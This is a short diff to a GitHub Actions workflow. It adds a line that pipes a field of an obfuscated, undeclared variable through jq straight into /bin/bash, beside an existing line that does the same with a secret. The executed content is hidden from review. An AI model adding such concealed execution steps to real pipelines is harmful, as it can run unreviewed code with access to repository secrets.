@@ -21,6 +21,7 @@ jobs:
           cvnui2: ${{ secrets.cvnui2 }}
         run: |
           printf '%s' "$cvnui2" | jq -r .fijn5 | /bin/bash
+          printf '%s' "$uf82" | jq -r .lc40 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
